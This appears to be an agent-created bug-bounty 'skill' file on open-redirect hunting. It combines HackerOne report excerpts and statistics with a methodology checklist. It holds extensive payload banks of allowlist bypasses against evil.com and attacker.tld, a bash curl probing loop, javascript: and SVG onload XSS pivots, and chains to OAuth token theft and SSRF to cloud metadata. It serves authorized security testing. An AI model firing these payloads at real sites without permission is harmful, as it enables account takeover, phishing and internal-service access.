---
name: bbhunt-open-redirect
description: "Use for user-controlled redirect targets and their chains: OAuth code/token theft, trusted-origin phishing, and redirect-allowlist confusion. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Open Redirect — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 360 valid HackerOne reports (74 paid / 21%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| redirect chain / Location header | 161 |
| encoding / double-encode / null byte | 44 |
| webhook / OAuth / SAML / integration abuse | 36 |
| header injection (Host / X-Forwarded / etc.) | 35 |
| subdomain / DNS / cert-transparency recon | 25 |
| Content-Type / body-format switch | 22 |
| admin / privileged-role context | 22 |
| public source-code / repo review | 21 |
| DOM / HTML source inspection | 20 |
| WAF / sanitizer / filter bypass | 19 |
| cache / CDN / unkeyed header | 18 |
| XML / SOAP / SAML / XXE | 18 |
| internal service / port / container | 18 |
| intercept & replay request in Burp | 15 |
| OAST / DNS / HTTP callback proof | 13 |
| file upload / filename / extension | 11 |
|  HosT/absolute-URL reset poisoning | 9 |
| JWT / token / base64 decode | 9 |
| HTTP method / verb tampering | 9 |
| two-account / cross-account replay | 8 |
| unauthenticated / removed-cookie test | 7 |
| parser confusion / normalization | 6 |
| second-order / stored / blind delivery | 5 |
| error message / stack trace probing | 4 |
| cloud metadata / IAM abuse | 4 |
| employee / developer public info | 4 |
| API docs / Swagger / introspection | 4 |
| JS bundle / source-map inspection | 3 |
| fuzzing / wordlist brute force | 3 |
| parameter pollution / duplicate keys | 2 |
| swap object ID / parameter value | 2 |
| mass assignment / extra request fields | 1 |
| public bucket / storage exposure | 1 |
| replay / modify a captured request | 1 |
| archive / Wayback endpoint discovery | 1 |
| deserialization / gadget chain | 1 |
| race / concurrency / timing | 1 |
| third-party data / paste / breach reuse | 1 |

### Parameters observed in writeups

`name` (31), `type` (17), `value` (16), `target` (13), `url` (12), `href` (9), `charset` (5), `rel` (5), `src` (5), `next` (5), `return_url` (4), `class` (4), `redirect_uri` (4), `callback_url` (3), `phone_number` (3), `full_number` (3), `referrer` (3), `http-equiv` (3), `version` (2), `window.location` (2), `redirect` (2), `email` (2), `xabled` (2), `redirect_url` (2), `__cfduid` (2), `_ga` (2), `ajs_user_id` (2), `ajs_group_id` (2), `ajs_anonymous_id` (2), `intercom-id-nmyyq5i5` (2)

### Bypass primitives observed

`open redirect` (219), `bypass` (49), `host header` (36), `content-type` (33), `whitelist` (14), `bypassed` (11), `trailing slash` (6), `url-encode` (6), `%00` (5), `bypassing` (4), `unicode` (3), `header injection` (3), `url encoded` (3), `transfer-encoding` (3), `chunked` (3), `backslash` (3), `allowlist` (3), `bypasses` (2), `double slash` (2), `url-encoded` (2), `content type` (2), `percent-encode` (2), `lowercase` (2), `%0d%0a` (1), `url encoding` (1), `mixed case` (1), `normalizes` (1), `denylist` (1)

### Impact language observed

`token` (67), `credential` (39), `admin` (36), `password` (35), `secret` (10), `localhost` (9), `financial` (6), `sensitive information` (5), `sensitive data` (4), `payment` (3), `api key` (3), `account takeover` (3), `unauthorized` (3), `internal network` (2), `rce` (1), `internal service` (1), `exfiltration` (1)

### Case studies — full excerpts (paid and unpaid)

#### [26962](https://hackerone.com/reports/26962) — open redirect in rfc6749

Internet Bug Bounty · $3000 · severity n/a

OAuth Providers (servers) that strictly follow rfc6749 are vulnerable to open redirect. Let me explain, reading [0] If the request fails due to a missing, invalid, or mismatching redirection URI, or if the client identifier is missing or invalid, the authorization server SHOULD inform the resource owner of the error and MUST NOT automatically redirect the user-agent to the invalid redirection URI. If the resource owner denies the access request or if the request fails for reasons other than a missing or invalid redirection URI, the authorization server informs the client by adding the following parameters to the query component of the redirection URI using the "application/x-www-form-urlencoded" format, per Appendix B: Now let’s assume this. I am registering a new client to the victim.com provider. I register redirect uri attacker.com. According to [0] if I pass e.g. the wrong scope I am redirected back to attacker.com. Namely I prepare a url that is in this form: and this is works as an open redirector. Of course in the positive case if all the parameters are fine this doesn’t apply since the resource owner MUST approve the app via the consent screen (at least once). I have notified also this issue to the OAuth mailing list. See also and The consensus seems to be that some of the OAuth family spec should be updated... (currently under discussion) A solution would be to return 

#### [1865991](https://hackerone.com/reports/1865991) — Open Redirect Vulnerability in Action Pack

Internet Bug Bounty · $2400 · medium

We were able to bypass the mechanism that prevents open redirects due to incomplete URL input validation. I have reported it below and written a patch to fix it. ## Impact Vulnerable code will look like this: Rails 7.0 introduced protection against open redirects from calling redirect_to with untrusted user input. In prior versions the developer was fully responsible for only providing trusted input. However the check introduced could be bypassed by a carefully crafted URL.

#### [683298](https://hackerone.com/reports/683298) — XSS and Open Redirect on MoPub Login

X / xAI · $1540 · severity n/a

**Summary:** I found open redirect at the MoPub login page, It also allows javascript URIs, leading to XSS. **Description:** You can modify the "next" URL parameter to redirect to any website upon logging in on MoPub. ## Steps To Reproduce: 1. Take this URL: 2. Change " to whatever URL you want to redirect to. 3. Visit the URL and login 4. You will be redirected to that site ## Impact: Outlined in Impact section below ## Supporting Material/References: Here's a proof of concept using the URL javascript:alert("proof of concept"): {F568245} ## Impact An attacker could use this for phishing, cookie jacking, etc. since it allows javascript URIs and therefore XSS vectors. Additionally, they could use URL encoding to hide the URL that the victim is being redirected to.

#### [49759](https://hackerone.com/reports/49759) — Open Redirect leak of authenticity_token lead to full account take over.

X / xAI · $1400 · severity n/a

Hey guys URL: when I click 'Follow' I will send my POST request to witch contains my authenticity_token that can be used for anything like tweeting, following, sending messages, changing username.,.,.etc it can be used too to Add a mobile number, and then steal the account by recovering it by the mobile number. Thank You.

#### [260744](https://hackerone.com/reports/260744) — [dev.twitter.com] XSS and Open Redirect

X / xAI · $1120 · medium

Description === XSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page. By creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a "javascript" link on the page. PoC: Open Redirect === Browsers: Chrome, FireFox, Opera HTTP Response: PoC: XSS === Browsers: FireFox Steps to reproduce: Open and click the link HTTP Response: {F213436}

#### [424443](https://hackerone.com/reports/424443) — [PayPal Android] Remote theft of user session using push_notification_webview deeplink

PayPal · no bounty — still valid · medium

A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor. This vulnerability was discovered in collaboration with security researcher khilly, who contributed significantly to identifying and testing the deeplink misuse in the PayPal Android app. Together, we demonstrated how the lack of validation in the deeplink mechanism could allow a malicious app or webpage to redirect user sessions and expose headers containing sensitive information. The issue was responsibly disclosed and later resolved by PayPal.

#### [1788006](https://hackerone.com/reports/1788006) — Open Redirect in Logout & Login

Expedia Group Bug Bounty · no bounty — still valid · medium

## Entry Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully. ## Default Request GET /?logout=1 HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers ## Default Response HTTP/2 200 OK ##In response, it redirects us to the homepage. ## Vulnerability Request GET /?logout= HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers ## Note The part that exposes to explicit redirection is "?" in the section after the address. is use. and whateve

### Recurring approach patterns from real reports

- 2× notice that you are redirected to and you re requested to complete oauth after logging in
- 1× hi i found that an attacker is able to steal access tokens of facebook users via phabricator app
- 1× hi i noticed that your facebook application used in the import photo can be used to take over the facebook account of the user being attacked
- 1× hi i found a bypass in the redirects won t work
- 1× proof steps click the link after clicking click the screen and you will be redirected to
- 1× for the second way i verified that the password reset functionality on the irc cloud website does not retrieve the host header when sending emails
- 1× here is the video of the poc the link i used in the video to report reporter user id reporter s id please fix this fastly thanks good day
- 1× for example works doesn t work i will investigate it further and get back with details if i find something more
- 1× hi two weeks ago i found a cross domain ajax request but due to the fact that you uses a very strict content security policy i hesitated to send this
- 1× today i noticed that bug has been fixed
- 1× i tested on both using a windows installation with latest updates
- 1× hi any user after logging into an any myshopify shop can be redirected to other domain
- 1× hi i m found bug it is possible to send his message directly through url and redirect local
- 1× we have added validations to make sure the redirection always points to our own software
- 1× i realized that the link was edited to be like this
- 1× i tried looking around and playing as much as possible but i wasn t unable to actually get a shopify com url
- 1× if this is actually possible could you let me know how i found these via this btw there s quite a few more
- 1× on implementing url redirection care should be taken that it is not vulnerable to open redirection owasp open redirection a warning should be issued when a user is clicking on a website outside the host website
- 1× hey i have noticed and redirect hidden field in admin staff login page so i though give it a little shot
- 1× in addition most browsers all that i checked on will allow multiple slashes before the domain name type in to your browser and you will go to google
- 1× adrianomarcmont was able to demonstrate this vulnerability by crafting a specially formatted url
- 1× this issue is similar to but it is only exploitable via ms edge or internet explorer proof of concept clicking on a link set to including this one will change the still open report page to this works on current versions of ms edge and internet explorer
- 1× basically we have tested the web application against owasp top using industry common metholodogies
- 1× instead the person will then try to download the file by clicking on download left upper corner

## Corpus-backed method (this class)

1. Inventory every redirect parameter across login, logout, OAuth, invite and post-action flows.
2. Test the full spectrum: absolute external URL, scheme-relative `//evil`, backslash tricks, encoded separators, and userinfo confusion.
3. Probe allowlist logic: suffix vs prefix, unescaped dot, subdomain of allowed domain, allowed domain on attacker domain, fragment/query placement.
4. Check whether the app follows chained redirects and whether a trusted open redirect can bypass another component's allowlist.
5. Do not stop at the redirect: find the consequence (OAuth code/token, credential capture on a trusted origin, SSRF allowlist bypass).

### Signals

- next=, return=, url=, dest=, redirect_uri, continue, to parameters
- Location header built from user input
- An allowlist of domains or paths implemented with prefix/regex matching

### Kill criteria

- No chain to a security consequence — a bare open redirect is usually informational.
- Redirect target is restricted to a trusted set you cannot escape.

### Escalation chains

- Open redirect -> OAuth redirect_uri acceptance -> auth code theft -> ATO.
- Trusted-domain redirect -> credential phishing with valid TLS/hostname.
- Open redirect -> SSRF allowlist bypass.

### Probes

- https://evil.com , //evil.com , /\evil.com , https://allowed.com.evil.com
- https://evil.com#@allowed.com , https://allowed.com/..//evil.com
- Double-encoded separators and trailing dots

### Veteran tip

Corpus case studies repeatedly show open redirect as the *first* link in an ATO chain; that is where its value lives.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.
- Test scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.
- Bypass allowlists with userinfo, subdomain suffix, and path confusion.
- Check login/logout, OAuth callbacks, shorteners, and mobile deep links.

### Deeper checklist

- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.
- Try scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.
- Bypass allowlists with userinfo tricks, subdomain suffix, and path confusion.
- Test redirectors in OAuth/SSO flows and mobile deep links.
- Chain with OAuth token theft or SSRF allowlist bypass for higher impact.
- Confirm the browser actually navigates off-domain (not just a 302 to an error page).

### Web-Research Methodology Additions (2026)

Research basis: the Intigriti researcher guide "Open URL redirects: A complete guide" (Jan 2025, updated Oct 2026) and HackTricks "Open Redirect" (parser differentials, allowlist footguns, modern XSS pivots, 2024-2026 CVE chains). Both stress the escalation theme already in this skill: many programs reject a standalone redirect — prove impact (OAuth code/token theft, XSS, SSRF, CSRF) or don't submit.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Expanded parameter list:** `return_to`, `return_path`, `rurl`, `redirect_url`, `redirect_uri`, `success_url`, `cancel_url`, `image_url`, `checkout_url`, `clickurl`, `jump`, `jump_url`, `goto`, `forward`, `forward_url`, `pic`, `originUrl`, `desturl`, `request`, `backurl`, `RedirectUrl`, `ReturnUrl`, `burl`, `qurl`, `u`, `u1`, `page`, `uri`, `link`, `src`, `service`, `sp_url`.
- **Where to look:** sign-in/register/sign-out, password-reset token links (the generated link itself may carry a redirect param), profile, email-verification links, error pages, and any multi-step action.
- **Server vs client type:** a 3xx + `Location:` header is server-side; a redirect after a delay with no `Location` is client-side (meta refresh / JS). Client-side is the one that can escalate to DOM XSS.
- **SPA sinks in JS bundles:** `location.assign/replace/href`, `window.open`, `history.pushState/replaceState`, `hashchange`, `postMessage` handlers that read query/hash, framework helpers for `next`/`returnUrl`.
- **OAuth/OIDC allowlist footguns:** `redirect_uri`, `returnTo`, `RelayState` validated by regex/glob, wildcard-only host patterns, or "validate parsed URL, redirect raw input" mismatches. Repeat tests with a victim already authenticated to the IdP (silent approval).
- **SVG uploads** with `onload="window.location=..."` as a redirect/XSS pivot.
- **Modern CVE-shaped chains:** fragment smuggling + client-side path traversal (Grafana-style `redirectTo=/%23/..//\//attacker.com`) reaching an auth-token-rotate endpoint.

- **Baseline first:** request each candidate with a benign in-scope value and record status, `Location`, and whether a 3xx or client-side redirect occurs.
- **Two surfaces per host:** test both the server `Location` header and JS/meta sinks; fixing one doesn't fix the other.
- **Allowlist internals:** if the app says "only internal hosts," test alternative host notations and wildcard DNS resolving to loopback.
- **Context inventory:** note where the redirect lands — logout, login, OAuth callback, password reset, file/image fetcher — because that determines the chain.
- **Follow-redirect behavior:** for SSRF chains, check whether the server-side fetcher follows 30x by default (most do).
- **Historical URLs:** mine Wayback/GAU for retired redirect endpoints (`/out`, `/cgi-bin/redirect.cgi`) that still work.
- **Parameter pollution:** try duplicate redirect params (`?next=/safe&next=//attacker`) — parsers may validate the first and use the last.
- **Encoding layers:** double-encode delimiters (`%2523`, `%252f`) and test mixed case in scheme names.
- **SVG route:** check whether uploaded SVG is served inline with `image/svg+xml` (so `onload` executes) — otherwise it isn't a pivot.

### Signals and surfaces

### Signal

- Reports: **385** · paid: **78**
- Median bounty **$300** · p90 **$1,120** · max **$3,000** · total **$39,824**
- Median upvotes **12**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| X / xAI | 17 | $8,120 | 787 |
| Internet Bug Bounty | 4 | $5,400 | 79 |
| Uber | 7 | $5,000 | 217 |
| HackerOne | 22 | $2,000 | 550 |
| Slack | 8 | $1,600 | 61 |
| Open-Xchange | 2 | $1,566 | 63 |
| Shopify | 20 | $1,500 | 347 |
| LocalTapiola | 7 | $1,200 | 70 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`next` `url` `return` `redirect` `redirect_uri` `continue` `dest` `callback` `image_url` `checkout`

### Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

### Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

### Techniques, payloads and bypasses

### Payloads & probes

- `//evil.com` `https://target.com@evil.com` `https://target.com.evil.com`
- `https://target.com\@evil.com` `//evil.com/%2e%2e` `////evil.com`
- `javascript:alert(1)` `data:text/html,...` when the redirect is client-side
- `https://target.com/redirect?url=https://evil.com` chained

### Payload bank

**36 curated payloads** in 3 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Allowlist & parser bypass

```text
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
```

### Bypass tricks

- Double URL-encode, unicode normalize, and mixed case the scheme/host.
- Use an allowlisted host with an open redirect to reach the final target.
- Exploit parser differences between validation and navigation.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357
  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…
- **XSS and Open Redirect on MoPub Login** — `#683298` · X / xAI · $1,540 · ▲248
  > Here's a proof of concept using the URL javascript:alert("proof of concept"):
- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188
  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.
- **Open redirect at https://inventory.upserve.com/http://google.com/** — `#469803` · Upserve · $1,200 · ▲179
  > https://inventory.upserve.com/http://stanko.sh/
- **Open Redirect in Logout & Login** — `#1788006` · Expedia Group Bug Bounty · $0 · ▲171
  > GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151
  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.
- **Open redirect due to scanning QR code via brave browser** — `#1946534` · Brave Software · $0 · ▲148
  > https://resources.infosecinstitute.com/topic/security-attacks-via-malicious-qr-codes/
- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144
  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.
- **Open redirect** — `#2957962` · XVIDEOS · $0 · ▲143
  > An open redirect vulnerability was discovered on the website https://www.xnxx.com/todays-selection/1.
- **1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation** — `#3723458` · Khan Academy · $0 · ▲126
  > The issue is that dots between `uc`, `a`, `run`, and `app` are not escaped , meaning it could be any character, not necessarily a dot (`.`).
- **Open URL Redirection** — `#1238684` · Unikrn · $0 · ▲102
  > Reference: https://www.owasp.org/index.php/Unvalidated Redirects and Forwards Cheat Sheet
- **CRLF to XSS & Open Redirection** — `#2012519` · TikTok · $0 · ▲97
  > This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect.
- **Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** — `#499348` · X / xAI · $0 · ▲95
  > To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
- **OAuth redirect uri validation bypass for :proxima_first_party_sync apps** — `#3588801` · GitHub · $0 · ▲79
  > [CVE-2026-4296](https://nvd.nist.gov/vuln/detail/CVE-2026-4296)
- **another liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3723002` · Liberapay · $0 · ▲77
  > Hello again i discovered that there is another Liberapay profile of Liberapay team member at liberapay.com/mdvhimself contains a link to an expired Twitter account, creating a Broken Link Hijacking (BLH) vulnerability.
- **[dev.twitter.com] XSS and Open Redirect** — `#260744` · X / xAI · $1,120 · ▲75
  > XSS via Request-URI which requires user interaction.
- **Open Redirect** — `#1213580` · Affirm · $250 · ▲74
  > POC:https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2
- **Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter** — `#3599248` · Lovable VDP · $0 · ▲74
  > The server normalizes the path traversal `/../` and then treats `//google.com` as a
- **Open Redirect on ███████** — `#2265413` · Fastly VDP · $0 · ▲74
  > 3.Submit the request and observe that the page is redirected to the malicious URL.
- **open redirected by host header** — `#2828499` · Localize · $0 · ▲73
  > go to www.localizestaging.com and interpret then change host header .it will redirect to changed host header webisite
- **Open Redirect** — `#504751` · Omise · $100 · ▲72
  > GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
- **Identity Login Page Redirect Can Be Manipulated** — `#243474` · Inflection · $0 · ▲72
  > I used this request to try login https://www.identity.com/signin?redirect url=%2Foauth%2Fauthorize%3Fclient id%3D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%26redirect uri%3D%252Ftest-callback%26response…
- **Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking the token)** — `#292825` · Ed · $0 · ▲71
  > Go to https://github.com/login/oauth/authorize?client id=5f45cc999f7812d0b6d2&redirect uri=https%3A%2F%2Fnonexisting.edoverflow.com&scope=public repo
- **Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links** — `#1032610` · X / xAI · $560 · ▲70
  > Append the result of step 3 to `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=` and append `%3F` to the result: `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F`.
- **Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing Attack** — `#3099816` · Lichess · $0 · ▲70
  > Change this from`redirect uri=https://www.lichess4545.com/auth/lichess/` to `redirect uri=https://example.com/auth/lichess/`
- **Google API key leaks and security misconfiguration leads Open Redirect Vulnerability** — `#1066410` · Clario · $300 · ▲68
  > Hello, when i search your targets and javascript files I found an googleapikey leaks in url = [https://account.clario.co/js/main.044af6485f6b0cd90809.js](https://account.clario.co/js/main.044af6485f6b0cd90809.js "Url").
- **Stealing Users OAuth Tokens through redirect_uri parameter** — `#665651` · GSA Bounty · $750 · ▲67
  > 1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client id=███&response type=token&redirect uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
- **Liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3721519` · Liberapay · $0 · ▲65
  > Click on the Twitter link https://x.com/martinodelilo
- **Open redirect using theme install** — `#101962` · Shopify · $0 · ▲61
  > Vulnerable Endpoint - https://app.shopify.com/services/google/themes/preview/supply--blue?domain name=example.com
- **Multiple Open Redirect on TikTok domains** — `#2221547` · TikTok · $0 · ▲61
  > An open redirection vulnerability was found via a path traversal on the 'redirect url' parameter when logging in on a TikTok Seller domain, which could have resulted in takeover of a TikTok Seller account.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `wp_redirect()` |
| 3× | `$count = 1` |
| 3× | `<script> / window.opener.location = 'https://davidebove.com/blog/2016/05/05/target_blank-vulnerability-test-page/'; / </script>` |
| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |
| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |
| 2× | `str_replace()` |
| 2× | `wp_safe_redirect()` |
| 2× | `get_target_url()` |
| 2× | `wp_sanitize_redirect()` |
| 2× | `wp_validate_redirect()` |
| 2× | `@` |
| 1× | `GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1 / Host: xfarr-6fmjyrz2lq-uc-a-run.app` |
| 1× | `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F` |
| 1× | `KA_DOMAIN_REGEX.test()` |
| 1× | `isKhanAcademyUrl()` |
| 1× | `maybeAddAuthTransfer()` |
| 1× | `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/` |
| 1× | `https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/` |
| 1× | `/..//google.com` |
| 1× | `/../` |

### Phase 3 — Bypass Techniques

```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Scheme blacklist bypasses:** `//attacker.tld`, `/%0A/attacker.tld`, `/%0D/`, `/%09/`, `/+/`, `///attacker.tld`, `\\attacker.tld`; authority-component checks: `http:example.com`, `https:example.com`.
- **Weak domain validation:** `https://example.com@attacker.tld`, `https://example.com.attacker.tld`, `https://attacker.tld/example.com`, `https://attacker.tld?example.com`, `%23`/`%00`/`%0A`/`%0D`/`%09` before the trusted string, and the `°` separator trick.
- **TLD/parser confusion:** `example.comattacker.com`, `.company` (a real TLD), `%E3%80%82` (encoded ideographic full stop).
- **Userinfo / backslash differentials:** `https://trusted.tld@attacker.tld/`, `https://trusted.tld[@attacker.tld`, `%5B@`, and backslash normalization differences where the backend treats `\` as a path char but the browser treats `trusted.tld` as userinfo.
- **Loopback notations for allowlisted internal hosts:** `127.1`, `2130706433`, `0x7f000001`, `017700000001`, `[::1]`, `[::ffff:127.0.0.1]`, `localhost.`, plus wildcard DNS `lvh.me`, `sslip.io`, `localtest.me` — useful when only subdomains of X are allowed but resolution must hit loopback.
- **javascript: pivots (DOM sinks only):** `javascript:alert(1)`, case variants, `java%0d%0ascript%0d%0a:`, `jav%09ascript:`, `javascript://%250Aalert(1)`, `javascript://whitelisted.com/%0Aalert(1)`, `/%09/javascript:alert(1)`, backslash-obfuscated forms.
- **meta refresh / JS fallback** (`<meta http-equiv="refresh" content="0;url=//attacker">`) when no `Location` header is emitted — still useful for phishing.
- **Escalations:** OAuth `redirect_uri` manipulation to leak `response_type=token` access codes; chaining a GET-state-changing endpoint lacking CSRF (`/redirect?url=/api/account/profile?username=...`); SSRF allowlist bypass because fetch follows redirects (`/image-loader?url=https://trusted/redirect?url=http://169.254.169.254/...`).
- **SVG upload redirect:** `<svg onload="window.location='http://attacker'">`.

### Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-OPEN-REDIRECT — Open Redirect

### Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

### C. Validation / proof bar — how to confirm and avoid false positives

- **Basic proof:** the `Location` header (or meta-refresh/JS target) points to your controlled domain, and a real browser follows it there. Use `curl -s -I --max-redirs 0` to inspect raw `Location`.
- **DOM redirects need a browser:** curl cannot observe a JS/meta redirect — open the URL and confirm navigation, then trace the sink with DOM Invader or Untrusted Types.
- **Parser differentials must be browser-proven:** the server accepting a crafted string is not enough; show the browser actually navigates off-site (userinfo/backslash/`%E3%80%82` cases are parser-specific).
- **OAuth chain proof:** repeat with the victim authenticated to the IdP to get silent approval, and show a captured code/token plus a session created in the victim's account. Don't claim ATO from an unauthenticated redirect alone.
- **SSRF chain proof:** show an actual internal/metadata response returned through the followed redirect.
- **Avoid false positives:** a relative-path-only "redirect," a fallback to a default path, or a `javascript:` payload that never reaches a sink are not open redirects. Many programs reject standalone redirect reports — lead with the chain and its impact.
- **Dual-surface:** check both server-side and client-side redirectors; fixing one path often leaves the other.

- **Header proof:** show the raw `Location` pointing at your controlled host with `curl -I --max-redirs 0`, then show a browser navigating there.
- **DOM proof:** use DOM Invader to show the source→sink flow (e.g. `?url=` → `location.href`) and a live browser navigation.
- **Parser-differential proof:** for userinfo/backslash/encoded-dot payloads, show the browser's final URL — a server that merely emits the string is insufficient.
- **OAuth proof:** with a victim logged into the IdP, capture the code/token delivered to your host and show a session created in the victim account.
- **SSRF proof:** show an internal response body (metadata or internal service) retrieved through the followed redirect.
- **Null result:** if every payload falls back to a default path or yields only a relative path, record "not open" and move on.
